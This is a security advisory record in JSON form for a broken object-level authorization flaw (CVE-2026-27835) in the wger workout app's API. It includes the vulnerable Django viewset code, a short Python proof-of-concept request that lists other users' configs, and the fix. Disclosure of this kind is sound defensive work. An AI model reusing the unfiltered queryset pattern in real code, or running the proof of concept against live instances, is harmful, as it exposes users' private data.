{
  "Severity": "MODERATE",
  "UpdatedAt": "2026-02-26T22:13:15Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "wger"
  },
  "Advisory": {
    "DatabaseId": 339435,
    "Id": "GSA_kwCzR0hTQS14ZjY4LThoanctN21wbc4ABS3r",
    "GhsaId": "GHSA-xf68-8hjw-7mpm",
    "References": [
      {
        "Url": "https://github.com/wger-project/wger/security/advisories/GHSA-xf68-8hjw-7mpm"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27835"
      },
      {
        "Url": "https://github.com/wger-project/wger/commit/1fda5690b35706bb137850c8a084ec6a13317b64"
      },
      {
        "Url": "https://github.com/advisories/GHSA-xf68-8hjw-7mpm"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-xf68-8hjw-7mpm"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2026-27835"
      }
    ],
    "Description": "### Summary\n\n`RepetitionsConfigViewSet` and `MaxRepetitionsConfigViewSet` return all users' repetition config data because their `get_queryset()` calls `.all()` instead of filtering by the authenticated user. Any registered user can enumerate every other user's workout structure.\n\n### Details\n\n`wger/manager/api/views.py:499` and `:518`:\n\n```python\n# VULNERABLE\nclass RepetitionsConfigViewSet(viewsets.ModelViewSet):\n    def get_queryset(self):\n        return RepetitionsConfig.objects.all()\n\nclass MaxRepetitionsConfigViewSet(viewsets.ModelViewSet):\n    def get_queryset(self):\n        return MaxRepetitionsConfig.objects.all()\n```\n\nEvery sibling viewset in the same file correctly filters by user. For example, `WeightConfigViewSet` at line 459:\n\n```python\n# CORRECT — how it should work\ndef get_queryset(self):\n    return WeightConfig.objects.filter(\n        slot_entry__slot__day__routine__user=self.request.user\n    )\n```\n\nThe same user filter is present on `SetsConfig`, `RestConfig`, `RiRConfig`, and their Max variants — only `RepetitionsConfig` and `MaxRepetitionsConfig` are missing it.\n\n### PoC\n\n```python\nimport requests\n\nBASE = \"http://localhost\"\nheaders = {\"Authorization\": \"Token YOUR_TOKEN\"}  # any registered user\n\nr = requests.get(f\"{BASE}/api/v2/repetitions-config/\", headers=headers)\nprint(r.json())  # returns ALL users' repetition configs, not just your own\n\nr = requests.get(f\"{BASE}/api/v2/max-repetitions-config/\", headers=headers)\nprint(r.json())  # same — all users' max repetition configs\n```\n\nRegistration is open by default. Sequential IDs allow full enumeration.\n\n### Impact\n\nAny authenticated user can read other users' repetition and max-repetitions configs, exposing workout structure (slot entry IDs, iteration values, operations, step counts, repeat flags, requirements JSON). This is a broken object-level authorization (BOLA/IDOR) vulnerability — the same class of issue as OWASP API1.\n\n**Fix**: Add the same user filter used by every other config viewset:\n```python\ndef get_queryset(self):\n    return RepetitionsConfig.objects.filter(\n        slot_entry__slot__day__routine__user=self.request.user\n    )\n```",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2026-02-26T22:13:13Z",
    "Severity": "MODERATE",
    "Summary": "wger: IDOR in RepetitionsConfig and MaxRepetitionsConfig API leak other users' workout data",
    "UpdatedAt": "2026-02-27T21:59:26Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 4.3,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003c= 2.1"
    }
  ]
}